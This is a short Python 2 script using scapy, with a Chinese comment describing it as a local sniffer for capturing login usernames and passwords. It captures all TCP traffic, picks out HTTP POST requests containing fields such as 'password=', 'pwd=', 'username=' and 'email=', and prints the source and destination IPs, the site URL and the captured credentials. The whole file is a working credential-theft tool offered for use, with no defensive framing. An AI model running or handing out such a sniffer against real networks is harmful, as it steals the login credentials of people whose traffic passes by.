#!coding=utf-8

from scapy.all import *
import re
import urlparse

'''
这是一个本地嗅探的脚本，可以嗅探出本地登陆的账号密码
'''

def outputss(pack):
	key=['password=','pwd=','username=','user=','pass=','email=','hash=']
	if pack[TCP].payload:
		content=str(pack[TCP].payload).lower()
		if "post" in content and "host" in content:
			for i in key:
				if i in content:
					res=r'.*'+i+'.*'
					res_host=r'host:(.*)'
					res_path=r'post(.*)'
					a=re.search(res,content)
					b=re.search(res_host,content)
					c=re.search(res_path,content)
					if a and b and c:
						c=c.group().split(' ')[1].replace('\r','')
						b=b.group().split(' ')[1].replace('\r','')
						b='http://'+b
						url=urlparse.urljoin(b,c)

						print u'[*]主机ip：%s' % pack[IP].src
						print u'[*]目的ip：%s' % pack[IP].dst
						print u'[*]网站url：%s' % url
						print u'[*]账号密码：%s' % a.group()
						print '---------------------------------------------------------'
					else:
						pass
					
					break
					
print u"开始嗅探......"
print ""
sniff(filter="tcp",count=0,prn=outputss,store=0)
